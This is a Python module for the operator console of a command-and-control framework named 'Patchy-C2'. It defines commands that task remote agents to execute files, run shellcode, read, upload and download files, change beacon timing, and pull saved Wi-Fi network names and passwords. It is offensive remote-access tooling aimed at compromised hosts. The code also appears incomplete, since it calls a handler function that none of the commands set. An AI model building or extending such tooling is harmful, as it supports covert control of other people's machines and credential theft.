import argparse
from colorama import init, Fore

init()
payloadTypes = {"dir": 0x01, "cat": 0x02, "change-time": 0x03, "download-file": 0x04, 
"execute-file": 0x05, "get-net-password": 0x06,
"get-exe-dir": 0x07, "get-net-names": 0x08, "get-all-net-passwords": 0x9, "upload-file": 0xa}

q_payloads = {0x01, 0x02, 0x04, 0x05, 0xa, 0x6}

main_parser = argparse.ArgumentParser()
sub_parser = main_parser.add_subparsers(dest="command")

# server management
start_server = sub_parser.add_parser("start-server")
start_server.add_argument("verbosity_level", choices=["0", "1", "2"], nargs="?", default="1", help="levels of verbose output for the server.\n 2 being the most verbose, 0 being the least")
start_server.add_argument("log_results", choices=["True", "False"], nargs="?", default="False", help="log agent responses")

# Agent management 
toggle_agent = sub_parser.add_parser("toggle-agent", help="Toggle agent to use")
toggle_agent.add_argument("agent_name", help="name of agent to toggle")

delete_all_agents = sub_parser.add_parser("delete-all-agents", help="deletes all agents from the file and databse system")

delete_agent = sub_parser.add_parser("delete-agent", help="deletes an agent along with all files associated with it")
delete_agent.add_argument("agent_name", help="name of agent to delete")

change_time = sub_parser.add_parser("change-time", help="Changes the time between an agent's beaconing")
change_time.add_argument("time", help="time in milliseconds")

view_agents = sub_parser.add_parser("view-agents", help="Displays all registered agents")

# payloads requiring a file path
dir_c = sub_parser.add_parser("dir", help="performs a custom implementation of dir on the agent")
dir_c.add_argument("filepath", help="path to remote directory")

download_file = sub_parser.add_parser("download-file", help="download file from agent")
download_file.add_argument("filepath", help="path to file on the agent")

upload_file = sub_parser.add_parser("upload-file", help="Uploads a file to the agent")
upload_file.add_argument("filepath", help="path to file on local machine")
upload_file.add_argument("remotepath", help="path to uploaded file on remote machine")

execute_file = sub_parser.add_parser("execute-file", help="Executes a file on agent")
execute_file.add_argument("filepath", help="Path to remote file")


shellcode_payload = sub_parser.add_parser("payload", help="Runs shellcode payload specified by local_filepath on agent")
shellcode_payload.add_argument("filepath", help="path to local file containing shellcode")

cat_file = sub_parser.add_parser("cat")
cat_file.add_argument("filepath")

get_exe_dir = sub_parser.add_parser("get-exe-dir", help="Gets directory of agent on agent")

# Wifi-related payloads
get_net_names = sub_parser.add_parser("get-net-names", help="Gets a list of saved network names on toggled agents")

get_net_password = sub_parser.add_parser("get-net-password", help="Gets security info of an agent's wifi network")
get_net_password.add_argument("remote_wifi", help="name of wifi network on agent")

get_all_net_passwords = sub_parser.add_parser("get-all-net-passwords", help="Gets all saved network security info")

def parse_command(user_input):
    if(user_input == "quit" or user_input == "exit"):
        p_success("Exiting C2 CLI")
        return False
    input_list = user_input.split(" ")
    diff_parse = input_list[0] != '-h' and input_list[0] in payloadTypes and payloadTypes[input_list[0]] in q_payloads
    if(diff_parse):
        input_list = user_input.split("\"")
        input_list = [x for x in input_list if x != "\"" and x != "" and x != " "]
        input_list[0] = input_list[0].replace(' ', '')
    print(input_list)
    args = main_parser.parse_args(input_list)
    args.func(args)
    return True

generic_tasks = [change_time, dir_c, upload_file, execute_file, shellcode_payload, 
cat_file, get_exe_dir, get_net_names, get_net_password, get_all_net_passwords, download_file]

def p_success(msg):
    print(Fore.GREEN + msg + Fore.RESET)

def p_failure(msg):
    print(Fore.RED + msg + Fore.RESET)

def p_warn(msg):
    print(Fore.YELLOW + msg + Fore.RESET)


prompt =  Fore.BLUE + "Patchy-C2->" + Fore.RESET

main_menu_icon2 = r'''

         ,-.
        / \  `.  __..-,O
       :   \ --''_..-'.'
       |    . .-' `. '.
       :     .     .`.'
        \     `.  /  ..
         \      `.   ' .
          `,       `.   \
         ,|,`.        `-.\
        '.||  ``-...__..-`
         |  |
         |__|
         /||\
        //||\\
       // || \\
    __//__||__\\__
   '--------------' C2 SERVER CONTROL
'''
